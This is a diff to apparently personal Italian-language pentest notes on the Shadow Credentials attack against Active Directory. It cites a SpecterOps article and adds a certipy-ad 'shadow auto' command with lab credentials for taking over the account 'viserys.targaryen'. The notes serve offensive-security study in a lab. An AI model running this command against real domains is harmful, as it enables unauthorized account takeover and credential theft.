@@ -270,3 +270,7 @@ Da fare
 [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 Stealth e molto utile in caso di vero pentest.
 Ha bisogno dell'opzione msDS-KeyCredentialLink abilitata sull'account (Se hai genericWrite o genericAll su un account puoi abilitarla da solo)
+```bash
+certipy-ad shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
+```
+![[Pasted image 20230828173854.png]]
